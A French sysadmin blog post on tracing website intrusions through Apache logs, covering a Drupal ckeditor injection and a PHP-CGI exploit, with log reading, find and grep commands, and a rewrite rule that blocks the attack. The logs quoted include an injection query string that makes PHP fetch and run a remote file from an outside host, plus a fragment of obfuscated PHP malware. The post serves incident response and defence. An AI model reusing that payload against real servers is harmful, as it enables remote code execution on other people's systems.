+++
author = "Skhaen"
categories = ["adminsys", "logs"]
date = 2015-04-29T15:08:00Z
description = ""
draft = false
slug = "remonter-une-attaque-avec-les-logs-dapache2"
tags = ["adminsys", "logs"]
title = "Remonter une attaque avec les logs d'Apache2"

+++

Nous allons voir dans cet article comment remonter une attaque suite au piratage d'un site avec les logs d'Apache. On partira du principe que Apache est déjà configuré pour mettre ses logs dans `/var/log/apache2` et dans les fichiers `access.log` et `error.log`.

La [documentation d'apache](https://httpd.apache.org/docs/2.4/fr/logs.html#accesslog) explique très bien comment est formé une ligne typique d'un fichier de log, mais découpons finement la ligne suivante pour voir ce que ça signifie : 

```
93.184.216.34 - - [20/Apr/2015:21:54:21 +0200] "GET /2015/01/25/NSA-bullrun.html HTTP/1.1" 200 8766 "https://www.libwalk.so/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" 0 
```

Pour info, ça consiste à la ligne suivante dans votre [configuration apache2](https://httpd.apache.org/docs/2.4/fr/mod/mod_log_config.html#formats) :

```
LogFormat "%{LOGIN}e %h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %T"
```

Pour la comprendre plus facilement, on peut imaginer la lire comme un journal de bord dans lequel la personne qui s'en chargerait raconterait tout avec le plus de détails possible. Dans l'exemple ci-dessus, les logs nous racontent que :

* <em>J'ai eu une requête provenant de l'adresse IP **93.184.216.34** le **20 avril 2015 à 21h54 et 21 secondes** (**+0200** indiquant la [timezone](https://en.wikipedia.org/wiki/Time_zone) de votre serveur), elle m'a demandé (**GET**) d'accéder à la ressource **/2015/01/25/NSA-bullrun.html** en utilisant le protocole **HTTP/1.1**.</em>

* <em>J'indique ensuite le [statut de cette ressource](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes) (*200*), ainsi que sa taille (ici le [nombre d'octets envoyés, y compris les en-têtes](https://httpd.apache.org/docs/2.4/fr/mod/mod_log_config.html#formats)) (*8766*).</em>

* <em>Elle m'indique venir du site **https://www.libwalk.so** (**referer**) et m'affirme l'avoir fait en utilisant le logiciel **Mozilla/5.0 [...]** (*user-agent*). Et j'ai mis **0** secondes à servir cette ressource.</em>




## Navigation

Pour comprendre comment on peut retrouver des traces d'une personne (ou d'un bot) "facilement", voici les logs que génère un visiteur en arrivant sur ce blog (j'ai passé des lignes pour que ce soit plus lisible) :

```
93.184.216.34 - - [20/Apr/2015:21:53:45 +0200] "GET / HTTP/1.1" 200 2605 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" 0 

93.184.216.34 - - [20/Apr/2015:21:53:45 +0200] "GET /css/slimbox2.css HTTP/1.1" 200 536 "https://www.libwalk.so/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" 0 

93.184.216.34 - - [20/Apr/2015:21:53:45 +0200] "GET /css/bootstrap.min.css HTTP/1.1" 200 16343 "https://www.libwalk.so/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" 0 

93.184.216.34 - - [20/Apr/2015:21:53:46 +0200] "GET /css/style.css HTTP/1.1" 200 673 "https://www.libwalk.so/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" 0 

```

Puis en cliquant sur le bouton "read more" de l'article "[NSA - À propos de BULLRUN](https://www.libwalk.so/2015/01/25/NSA-bullrun.html) :


```
93.184.216.34 - - [20/Apr/2015:21:54:21 +0200] "GET /2015/01/25/NSA-bullrun.html HTTP/1.1" 200 8766 "https://www.libwalk.so/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" 0 

93.184.216.34 - - [20/Apr/2015:21:54:21 +0200] "GET /images/2014/snowden/trivial_catastrophic.png HTTP/1.1" 200 96122 "https://www.libwalk.so/2015/01/25/NSA-bullrun.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" 0 

93.184.216.34 - - [20/Apr/2015:21:54:21 +0200] "GET /images/2014/snowden/PGP_encrypted1.png HTTP/1.1" 200 15137 "https://www.libwalk.so/2015/01/25/NSA-bullrun.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" 0 

93.184.216.34 - - [20/Apr/2015:21:54:21 +0200] "GET /images/2014/snowden/OTR_encrypted1.png HTTP/1.1" 200 45057 "https://www.libwalk.so/2015/01/25/NSA-bullrun.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36" 0 
```

Dans la première partie, il arrive donc sur la page d'accueil du site, et il demande les CSS pour pouvoir afficher l'ensemble convenablement. Dans la seconde partie, on peut voir qu'il charge la page de l'article et qu'il "demande" les images d'illustrations qui vont avec.

## Codes et méthodes

Les quelques lignes de logs que vous avez ci-dessus sont toujours sur le même modèle (même méthode HTTP, même code HTTP, ...), avant de continuer, voici quelques éléments supplémentaires pour mieux comprendre la suite :

#### liste des [codes HTTP](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes), avec ceux que l'on retrouve le plus souvent) : 

Nous avons eu seulement des codes `200` dans les requêtes ci-dessus. Voici une [vue rapide](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes) de ce que l'on peut avoir :

* `1xx` : message d'information, type "requête reçue, le process continue"
* `2xx` : message annonçant un succès
 * `200` : OK 
* `3xx` : message annoncant une redirection
 * `307` : redirection temporaire
 * `308` : redirection permanente
* `4xx` : erreur du client
 * `401` : requête non autorisée
 * `403` : requête interdite
 * `404` : requête non trouvée
* `5xx` : erreur du serveur
 * `503` : service non disponible

#### liste des [méthodes HTTP](https://fr.wikipedia.org/wiki/Hypertext_Transfer_Protocol)

* `GET` 	: demande une ressource (la requête étant normalement sans effet sur celle-ci ressource)
* `POST` 	: transmet des données en vue d'un traitement. Le résultat peut être la création de nouvelles ressources (fichiers...) ou la modification de fichiers existants.
* `HEAD` 	: demande seulement des informations sur la ressource (sans demander la ressource elle-même)

À noter qu'il existe d'autres méthodes ([DELETE, PUT, TRACE...](https://fr.wikipedia.org/wiki/Hypertext_Transfer_Protocol)) mais qui apparaissent très, très rarement. Si vous vous êtes fait pirater, et que vous avez une idée du moment de l'attaque, commencez par regarder les requêtes `POST` ayant eu lieu à ce moment là :) 

## Temps de jouer à cache-cache

Nous allons voir ici deux exemples d'attaques différentes pour vous donner des pistes à suivre.

### exemple 1 : drupal

Un attaquant a réussi à injecter du code sur un drupal.

En regardant les fichiers modifiés récemment du site, par exemple avec la commande `find` et son option `-mtime`(fichier dont les données ont été modifiées il y a n*24 heures). Dans cette ligne de commande, je recherche donc les fichiers php ayant été modifiés il y a moins de 2 jours.

```
find . -mtime -2 -iname "*.php"
```

Après un piratage, on trouve souvent des fichiers avec des lignes en plus (souvent en [base64](https://fr.wikipedia.org/wiki/Base64) ou avec des chaînes de caractères étranges) :

```
$YLbgPfj524 = "vh46afl7tm2ik*n3pws.bu;0j)(qo_erzxy51dg9c8/";$oDJXw7301 = $YLbgPfj524[16].$YLbgPfj524[31].$YLbgPfj524[30].$YLbgPfj524[38].$YLbgPfj524[29].$YLbgPfj524[31].$YLbgPfj524[30].$YLbgPfj524[16].$YLbgPfj524[6].$YLbgPfj524[4].$YLbgPfj524[40].$YLbgPfj524[30];$Gcwa9593
```
                                                                                                                   
Regardons la date exacte de modification d'un des fichiers :

```
ls -l sites/all/themes/wtm7973n.php
-rw-rw---- 1 www-data www-data 1285 mars  28 06:03 ./sites/all/themes/wtm7973n.php
```

et d'un autre :

```
ls -l sites/default/db.php
-rw-rw---- 1 www-data www-data 510 mars  28 06:19 ./sites/default/db.php
```


Notre première piste : le 28 mars à 06h03 (c'est l'heure la plus ancienne que je trouve dans les fichiers modifiés) ; si les logs sont particulièrement verbeux, on peut affiner directement en enlevant les requêtes `GET`, par exemple avec `cat access.log|grep -v "GET"|less`).

#### Cherchons dans les logs

On ouvre les logs avec la commande `less` (`less access.log`) puis on utilise la touche `/` pour lancer une recherche (par exemple `2015:06:03`) pour voir les requêtes  au moment de l'attaque.

```
68.180.228.246 - - [28/Mar/2015:06:02:02 +0100] "GET /lidentite-0 HTTP/1.1" 200 8409 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 1 
157.55.39.120 - - [28/Mar/2015:06:02:22 +0100] "GET /printmail/5732 HTTP/1.1" 200 8176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 1 
157.55.39.120 - - [28/Mar/2015:06:02:35 +0100] "GET /print/1832 HTTP/1.1" 200 4531 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 0 
157.55.39.120 - - [28/Mar/2015:06:02:43 +0100] "GET /print/5041 HTTP/1.1" 200 6582 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 0 
81.163.131.61 - - [28/Mar/2015:06:03:07 +0100] "POST /index.php?q=fckeditor%2Fxss HTTP/1.1" 404 29446 "-" "-" 1 
81.163.131.61 - - [28/Mar/2015:06:03:09 +0100] "POST /index.php?q=ckeditor%2Fxss HTTP/1.1" 200 3 "-" "-" 0 
81.163.131.61 - - [28/Mar/2015:06:03:10 +0100] "POST /index.php?q=ckeditor%2Fxss HTTP/1.1" 200 13 "-" "-" 0 
81.163.131.61 - - [28/Mar/2015:06:03:11 +0100] "GET /sites/all/themes/wtm7973n.php HTTP/1.1" 200 109 "-" "-" 0 
91.194.60.86 - - [28/Mar/2015:06:05:01 +0100] "GET /cron.php?cron_key=SkL5Ge7 HTTP/1.1" 200 3 "-" "Wget/1.13.4 (linux-gnu)" 10 
207.46.13.9 - - [28/Mar/2015:06:05:12 +0100] "GET /print/2862 HTTP/1.1" 200 4324 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 1 
148.251.68.67 - - [28/Mar/2015:06:05:18 +0100] "GET / HTTP/1.1" 200 50604 "-" "aria2/1.18.6" 1 
188.165.15.98 - - [28/Mar/2015:06:05:28 +0100] "GET /concours HTTP/1.1" 200 9948 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" 0 
157.55.39.120 - - [28/Mar/2015:06:05:51 +0100] "GET /node/6164 HTTP/1.1" 200 9574 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 1 
207.46.13.9 - - [28/Mar/2015:06:06:42 +0100] "GET /breves/www.news.fr HTTP/1.1" 200 9787 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 1 
83.169.91.4 - - [28/Mar/2015:06:06:58 +0100] "GET / HTTP/1.1" 200 50604 "-" "Mozilla/5.0 (X11; Linux i686; rv:19.0) Gecko/20100101 Firefox/19.0" 1 
81.163.131.61 - - [28/Mar/2015:06:07:06 +0100] "POST /sites/all/themes/wtm7973n.php HTTP/1.1" 200 1123 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET4.0C; .NET4.0E)" 1 
81.163.131.61 - - [28/Mar/2015:06:07:08 +0100] "GET /wp-conf.php?t8449n=1 HTTP/1.1" 200 29207 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET4.0C; .NET4.0E)" 0 
125.209.235.176 - - [28/Mar/2015:06:07:14 +0100] "GET /robots.txt HTTP/1.1" 200 649 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://help.naver.com/robots/)" 0 
125.209.235.179 - - [28/Mar/2015:06:07:15 +0100] "GET / HTTP/1.1" 200 10929 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://help.naver.com/robots/)" 1
```

À 6:03:07, une première tentative d'injection (POST) semble rater (code 404) : 

```
81.163.131.61 [28/Mar/2015:06:03:07] "POST /index.php?q=fckeditor%2Fxss 404
```

Mais les deux suivantes fonctionnent (code 200) :

```
81.163.131.61 [28/Mar/2015:06:03:09 ] "POST /index.php?q=ckeditor%2Fxss  200
81.163.131.61 [28/Mar/2015:06:03:10] "POST /index.php?q=ckeditor%2Fxss 200
```

Puis une requête sur un fichier avec un nom étrange :

```
81.163.131.61 [28/Mar/2015:06:07:06] "POST /sites/all/themes/wtm7973n.php HTTP/1.1" 200
```

Et il vient d'être créé :

```
ls -l ./sites/all/themes/wtm7973n.php
-rw-rw---- 1 2003 2003 1285 mars  28 06:03 ./sites/all/themes/wtm7973n.php
```

Si on continue encore un peu dans les logs, on voit cette ligne :

```
81.163.131.61 [28/Mar/2015:06:07:08] "GET /wp-conf.php?t8449n=1 HTTP/1.1" 200
``` 

Rien ne vous saute aux yeux ? Le fichier [wp-conf.php](http://www.wpbeginner.com/glossary/wp-config-php/) est propre à wordpress, et n'a rien à faire sur un drupal. Il faudra prévoir de faire un peu de nettoyage par la suite.

#### VU !

Donc, on aurait une attaque sur "ckeditor", qui aurait permis de créer d'autres fichiers. Après une petite recherche, [ckeditor](https://www.drupal.org/project/ckeditor) est un module pour Drupal avec [des failles connues](https://www.drupal.org/node/2357029), [dont la notre](https://www.drupal.org/node/1404488#comment-6616334).

Un [patch existe](https://www.drupal.org/node/1482528), il suffirait donc de restaurer une sauvegarde du site datant d'AVANT l'attaque puis de mettre le module à jour, ce qui permet d'éviter de devoir nettoyer les fichiers un par un, au risque d'en louper.


#### Allons plus loin

L'attaque *semble* venir d'une faille de ce module, mais autant en être sûr. N'hésitez surtout pas à rechercher dans les logs toutes les IP ayant fait une requête sur les fichiers pirates (wp-conf.php, wtm7973n.php...), puis sur toutes les requêtes que ces adresses IP ont faites.


Je ne vais pas vous mettre les logs de ces recherches ici, ça prendrait trop de place, mais je note que :

* 6 IPs différentes on fait des requêtes sur le fichier `wp-conf.php` :

```
zcat *.gz|grep wp-conf.php|awk {'print $1'}|sort|uniq -c
	1 188.162.64.65 - 492 requêtes, seulement des 404
	2 205.234.200.234
	2 31.184.195.247
	2 81.163.131.58
	9 81.163.131.61
	8 81.17.16.116
```

* L'IP 81.17.16.111 a fait une requête sur un fichier update.php du module [ctools](https://www.drupal.org/project/ctools), faudrait peut-être voir pour le mettre à jour par la même occasion si ce n'est pas le cas ;-)

```
81.17.16.111 - - [28/Mar/2015:18:22:05 +0100] "POST /sites/all/modules/ctools/page_manager/plugins/update.php HTTP/1.1" 200 13203 "-" "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130331 Firefox/21.0" 0
```

### exemple 2 : vulnérabilité sur PHP 5.2


Nous avons reçu 2 alertes dans la nuit concernant une attaque sur le site www.exemple.org. L'attaquant a profité de l'utilisation de php5.2 pour lancer le téléchargement d'un fichier sur un serveur distant via la commande wget (sans fichiers modifiés) mais en lançant un processus "ennemi" :

```
2001      3912  0.0  0.0  29700  4136 ?        S    01:50   0:00 /usr/sbin/httpd
```

En fouillant dans les logs au moment de l'attaque, on tombe sur cette ligne :

```
189.18.60.245 - - [20/Apr/2015:01:50:27 0200] "GET /?-d%20allow_url_include%3DOn-d%20auto_prepend_file%3Dhttp://www.krol.lt/run.txt HTTP/1.1" 200 7 "-" "Mozilla/3.0 (compatible; Indy Library)" 300
```

Et en fait, la réponse se trouve dans `error.log` :


```
[01:50:27] [error] [client 189.18.60.245] --2015-04-20 01:50:27-- http://www.krol.lt/w.txt
[01:50:27] [error] [client 189.18.60.245] Resolving www.krol.lt (www.krol.lt)...
[01:50:27] [error] [client 189.18.60.245] 5.199.171.10
[01:50:27] [error] [client 189.18.60.245] Connecting to www.krol.lt (www.krol.lt)|5.199.171.10|:80...
[01:50:27] [error] [client 189.18.60.245] connected.
[01:50:27] [error] [client 189.18.60.245] HTTP request sent, awaiting response...
[01:50:27] [error] [client 189.18.60.245] 200 OK
[01:50:27] [error] [client 189.18.60.245] Length: 29582
[01:50:27] [error] [client 189.18.60.245] (29K) [text/plain]
[01:50:27] [error] [client 189.18.60.245] Saving to: `w.txt'
[01:50:27] [error] [client 189.18.60.245]
[01:50:27] [error] [client 189.18.60.245] 0K .
[01:50:27] [error] [client 189.18.60.245] ........
[01:50:27] [error] [client 189.18.60.245] . .....
[01:50:27] [error] [client 189.18.60.245] ...
[01:50:27] [error] [client 189.18.60.245] .. ......
[01:50:27] [error] [client 189.18.60.245] .. 100%
[01:50:27] [error] [client 189.18.60.245] 171K=0.2s
[01:50:27] [error] [client 189.18.60.245]
[01:50:27] [error] [client 189.18.60.245] 2015-04-20 01:50:27 (171 KB/s) - `w.txt' saved [29582/29582]
[01:50:27] [error] [client 189.18.60.245]
```

La meilleure solution serait de mettre à jour le site pour utiliser une version de php plus récente que la version dont il a besoin actuellement (php 5.2) qui possède des vulnérabilités. Hélas, la meilleure solution n'étant pas toujours possible, il va falloir patcher directement. Si on connait la cause du problème, on trouve normalement des solutions rapidement sur le net, dans notre cas : [PHP-CGI Vulnerability Exploited in the Wild](https://blog.sucuri.net/2012/05/php-cgi-vulnerability-exploited-in-the-wild.html) qui explique le fonctionnement et la parade de cette attaque via un `.htaccess`.

Vous pouvez également éditer directement le(s) vhost(s)p our y ajouter les trois lignes suivantes :


```
RewriteEngine on
RewriteCond %{QUERY_STRING} (%2d|-)d.*auto_prepend  [NC]
RewriteRule .? - [F,L]
```

## En conclusion

Avant une attaque :

* mettre en place des sauvegardes (sites, base de données...) régulières et automatiques
* mettre en place un système pour être alerté en cas de problème (supervision sur les processus, chaînes de caractères présentes dans les fichiers...)

Après une attaque : 

* définir le moment de la création ou de la modification des fichiers
* rechercher dans les logs l'origine de l'attaque
* définir les différents attaquants (IP / origine de l'attaque)
* définir si d'autres fichiers ont été créé/modifié 

**Et bien entendu, se tenir à jour ET mettre à jour régulièrement ses CMS :**

* Drupal : [mise à jour](http://drupalfr.org/documentation/mise-a-jour) - [alertes sécurité](https://www.drupal.org/security)
* Dotclear : [mise à jour](http://fr.dotclear.org/documentation/2.0/admin/upgrade)
* Joomla : [mise à jour](http://aide.joomla.fr/telechargements/joomla-3-x-package-d-installation-et-patchs/patch-de-mise-a-jour-pour-joomla-3-3)
* Spip : [mise à jour](http://www.spip.net/fr_article1318.html) - [écran de sécurité](http://www.spip.net/fr_article4200.html Mettre en place l'écran de sécurité)
* Typo3 : [mise à jour](http://www.typo3.fr/mises-a-jour.html) - [alertes sécurité](https://typo3.org/teams/security/security-bulletins)
* Wordpress : [mise à jour](http://codex.wordpress.org/fr:Mettre_a_Jour_WordPress) - [renforcer wordpress](http://codex.wordpress.org/Hardening_WordPress)

